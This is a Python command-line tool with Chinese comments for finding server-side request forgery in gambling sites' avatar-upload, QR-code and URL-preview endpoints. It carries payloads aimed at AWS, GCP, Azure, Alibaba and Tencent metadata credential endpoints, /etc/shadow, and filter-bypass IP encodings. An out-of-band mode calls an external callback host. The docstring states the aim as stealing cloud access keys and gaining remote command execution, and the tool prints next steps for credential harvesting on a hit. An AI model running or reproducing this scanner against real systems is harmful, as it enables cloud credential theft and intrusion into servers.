#!/usr/bin/env python3
"""SSRF 探针 — 博彩站头像上传/URL 预览通用扫描。

博彩站的头像上传、二维码生成、图片 URL 预览功能 95% 存在 SSRF，
命中后可读取云主机 metadata → AK/SK → RunCommand RCE（等同于 heapdump 链）。

示例:
  python3 炼蛊房/ssrf_probe.py doctor
  python3 炼蛊房/ssrf_probe.py scan \
    --base https://target.com --case <案卷>
  python3 炼蛊房/ssrf_probe.py test \
    --url https://target.com/api/avatar \
    --param avatar_url --case <案卷>
  python3 炼蛊房/ssrf_probe.py oob \
    --url https://target.com/api/image/fetch \
    --param url --callback https://YOUR_WEBHOOK --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import re
import sys
import time
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "ssrf"
    d.mkdir(parents=True, exist_ok=True)
    return d

# SSRF 测试 payload（内网/metadata）
SSRF_PAYLOADS = {
    # 云主机 Metadata（最高价值）
    "aws_metadata":       "http://169.254.169.254/latest/meta-data/",
    "aws_credentials":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata":       "http://169.254.169.254/latest/user-data",
    "gcp_metadata":       "http://metadata.google.internal/computeMetadata/v1/",
    "gcp_token":          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "azure_metadata":     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "alibaba_metadata":   "http://100.100.100.200/latest/meta-data/",
    "alibaba_credentials":"http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    "tencent_metadata":   "http://metadata.tencentyun.com/latest/meta-data/",
    "huawei_metadata":    "http://169.254.169.254/openstack/latest/meta_data.json",
    # 内网服务探测
    "localhost_80":       "http://127.0.0.1:80/",
    "localhost_8080":     "http://127.0.0.1:8080/",
    "localhost_8888":     "http://127.0.0.1:8888/",
    "localhost_3306":     "http://127.0.0.1:3306/",
    "localhost_6379":     "http://127.0.0.1:6379/",
    "localhost_9200":     "http://127.0.0.1:9200/",
    "localhost_27017":    "http://127.0.0.1:27017/",
    "localhost_8848":     "http://127.0.0.1:8848/nacos/",
    # 协议探测
    "file_passwd":        "file:///etc/passwd",
    "file_shadow":        "file:///etc/shadow",
    "file_hosts":         "file:///etc/hosts",
    # 绕过过滤（IP 表示变体）
    "decimal_127":        "http://2130706433/",       # 127.0.0.1 十进制
    "hex_127":            "http://0x7f000001/",        # 127.0.0.1 十六进制
    "octal_127":          "http://0177.0.0.1/",
    "redirect_bypass":    "http://localhost.evil.com@127.0.0.1/",  # 需替换
    "ipv6_loopback":      "http://[::1]/",
    "ipv6_mapped":        "http://[::ffff:127.0.0.1]/",
    # 2026 作业层：短写 / 元数据十进制 / IMDSv2 探活
    "loop_short":         "http://127.1/",
    "loop_zero":          "http://0.0.0.0/",
    "meta_decimal":       "http://2852039166/latest/meta-data/",  # 169.254.169.254
    "meta_hex":           "http://0xa9fea9fe/latest/meta-data/",
    "aws_imdsv2_token":   "http://169.254.169.254/latest/api/token",
    "localtest_me":       "http://localtest.me/",
}

# 可能存在 SSRF 的端点路径
SSRF_ENDPOINTS = [
    # 头像/图片上传（URL 类型）
    ("/api/user/avatar", "avatar_url"),
    ("/api/upload/url", "url"),
    ("/api/image/fetch", "url"),
    ("/api/image/proxy", "url"),
    ("/api/proxy", "url"),
    ("/api/fetch", "url"),
    ("/api/screenshot", "url"),
    ("/api/preview", "url"),
    ("/api/qrcode", "url"),
    ("/api/qr/generate", "url"),
    ("/api/share", "link"),
    ("/api/link/preview", "url"),
    ("/api/shorturl", "url"),
    ("/api/webhook", "callback"),
    # 博彩站专用
    ("/api/deposit/notify", "notify_url"),
    ("/api/pay/callback", "callback_url"),
    ("/api/game/launch", "redirect_url"),
    ("/upload/avatar", "url"),
    ("/user/headpic", "headpic"),
    ("/api/user/update", "avatar"),
]

# 响应中表明 SSRF 命中的指纹
HIT_PATTERNS = [
    r"ami-[a-f0-9]+",                     # AWS AMI ID
    r"\"accountId\"\s*:",                  # AWS account
    r"\"availabilityZone\"",               # AWS AZ
    r"\"iam\"",                            # AWS IAM
    r'"access_token"',                     # GCP token
    r'"serviceAccounts"',                  # GCP SA
    r'"vmId"',                             # Azure VM ID
    r'"subscriptionId"',                   # Azure sub
    r"ram/security-credentials",           # Alibaba RAM
    r'"instance-id"',                      # Generic cloud
    r"root:x:0:0",                         # /etc/passwd
    r'"cluster_name"',                     # ES
    r"\+PONG",                             # Redis
    r"MySQL Community",                    # MySQL banner（单独 MySQL 太宽）
]

def make_session(proxy: str = "") -> requests.Session:
    import requests as rq
    s = rq.Session()
    s.verify = False
    s.headers["User-Agent"] = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36")
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def is_hit(text: str, baseline: str = "", payload: str = "") -> list:
    """基线里已有的指纹、以及回显出来的 payload 本身，都不算 SSRF。"""
    blob = text or ""
    if payload:
        blob = blob.replace(payload, "")
    hits = []
    for p in HIT_PATTERNS:
        if re.search(p, blob, re.I) and not (baseline and re.search(p, baseline, re.I)):
            hits.append(p[:40])
    return hits

def _baseline(sess, url: str, timeout: float) -> str:
    chunks: list[str] = []
    tmo = min(timeout, 5.0)
    try:
        chunks.append(sess.get(url, timeout=tmo).text or "")
    except Exception:
        pass
    try:
        chunks.append(sess.post(url, json={}, timeout=tmo).text or "")
    except Exception:
        pass
    return "".join(chunks)[:12000]

def test_endpoint(sess, base: str, path: str, param: str, timeout: float = 10.0) -> list:
    results = []
    url = base.rstrip("/") + path
    baseline = _baseline(sess, url, timeout)
    for payload_name, payload_val in SSRF_PAYLOADS.items():
        # 尝试 JSON POST
        for body in ({param: payload_val}, {"url": payload_val, "link": payload_val}):
            try:
                r = sess.post(url, json=body, timeout=timeout)
                hits = is_hit(r.text, baseline=baseline, payload=payload_val)
                if hits:
                    results.append({
                        "endpoint": path, "param": param,
                        "payload_name": payload_name,
                        "payload": payload_val,
                        "status": r.status_code,
                        "hits": hits,
                        "response_preview": r.text[:300],
                    })
            except Exception:
                pass
        # GET 请求
        try:
            r = sess.get(url, params={param: payload_val}, timeout=timeout)
            hits = is_hit(r.text, baseline=baseline, payload=payload_val)
            if hits:
                results.append({
                    "endpoint": path, "param": param,
                    "payload_name": payload_name, "payload": payload_val,
                    "method": "GET", "status": r.status_code,
                    "hits": hits, "response_preview": r.text[:300],
                })
        except Exception:
            pass
        time.sleep(0.2)
    return results

def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_REQUESTS else 'missing'}] requests")
    print(f"[ok] {len(SSRF_PAYLOADS)} SSRF payloads  ({len(SSRF_ENDPOINTS)} endpoint patterns)")
    print("[ok] ssrf_probe ready")
    return 0

def cmd_scan(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    sess = make_session(args.proxy)
    all_results = []

    print(f"[*] scanning {len(SSRF_ENDPOINTS)} potential SSRF endpoints …", flush=True)
    home_body = ""
    try:
        home_body = sess.get(base + "/", timeout=5).text or ""
    except Exception:
        pass
    for path, param in SSRF_ENDPOINTS:
        # 先快速探测端点是否存在；SPA 全路径同壳不算存在
        try:
            r = sess.get(base + path, timeout=5)
            if r.status_code == 404:
                continue
            if home_body and (r.text or "") == home_body:
                continue
        except Exception:
            continue

        print(f"  [exists] {path}  testing SSRF …", flush=True)
        hits = test_endpoint(sess, base, path, param, args.timeout)
        if hits:
            all_results.extend(hits)
            print(f"    ★★★ SSRF HIT: {path}  payloads={[h['payload_name'] for h in hits]}")
            for h in hits[:2]:
                print(f"    → {h['response_preview'][:100]!r}")

    out = case_dir(args.case)
    out_json = out / "ssrf_scan.json"
    out_json.write_text(json.dumps({"ts": _now(), "base": base, "hits": all_results},
                                   ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(all_results)} SSRF hits → {out_json}")
    if all_results:
        cloud_hits = [h for h in all_results if any(
            k in h["payload_name"] for k in ("metadata", "credentials", "token"))]
        if cloud_hits:
            print("\n★★★ 云主机 metadata SSRF 命中！")
            print("[next] 云元数据手法 + cloud-metadata-harvesting；AK 走阿里云AK-SK链，不是 heapdump")
    return 0 if all_results else 1

def cmd_test(args: argparse.Namespace) -> int:
    """测试单个端点。"""
    domain = host_of(args.url)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    sess = make_session(args.proxy)
    base = re.sub(r"(https?://[^/]+).*", r"\1", args.url)
    path = args.url[len(base):]
    results = test_endpoint(sess, base, path or "/", args.param, args.timeout)
    out = case_dir(args.case)
    (out / "ssrf_test.json").write_text(
        json.dumps({"ts": _now(), "url": args.url, "hits": results},
                   ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    for r in results:
        print(f"★ {r['payload_name']} → {r['hits']}")
        print(f"  {r['response_preview'][:200]!r}")
    print(f"[result] {len(results)} hits")
    return 0 if results else 1

def cmd_oob(args: argparse.Namespace) -> int:
    """OOB SSRF：使用外部 webhook 检测 DNS/HTTP 回调。"""
    domain = host_of(args.url)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    sess = make_session()
    callback = args.callback
    cb_host = callback.split("//")[-1].rstrip("/")
    oob_payloads = {
        "oob_http":     callback,
        "oob_metadata": f"http://169.254.169.254@{cb_host}/",
        "oob_redirect": f"http://{cb_host}@169.254.169.254/",
    }
    print(f"[*] OOB SSRF test: {args.url}  param={args.param}  callback={callback}")
    for name, val in oob_payloads.items():
        try:
            r = sess.post(args.url, json={args.param: val}, timeout=10)
            print(f"  [{name}] status={r.status_code} len={len(r.content)}")
        except Exception as e:
            print(f"  [{name}] err: {e}")
        time.sleep(1)
    print(f"\n[*] 等待 callback 回调到 {callback}")
    print("[hint] 用 interactsh 或 burp collaborator 监听 OOB 回调")
    return 0

def main() -> int:
    p = argparse.ArgumentParser(description="SSRF 探针（博彩站专项）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    sc = sub.add_parser("scan", help="批量扫描所有可能的 SSRF 端点")
    sc.add_argument("--base", required=True)
    sc.add_argument("--case", required=True)
    sc.add_argument("--proxy", default="")
    sc.add_argument("--timeout", type=float, default=10.0)
    sc.set_defaults(func=cmd_scan)

    ts = sub.add_parser("test", help="测试单个端点")
    ts.add_argument("--url", required=True)
    ts.add_argument("--param", required=True)
    ts.add_argument("--case", required=True)
    ts.add_argument("--proxy", default="")
    ts.add_argument("--timeout", type=float, default=10.0)
    ts.set_defaults(func=cmd_test)

    ob = sub.add_parser("oob", help="OOB SSRF（DNS/HTTP 回调）")
    ob.add_argument("--url", required=True)
    ob.add_argument("--param", required=True)
    ob.add_argument("--callback", required=True, help="你的 webhook URL")
    ob.add_argument("--case", default="")
    ob.set_defaults(func=cmd_oob)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
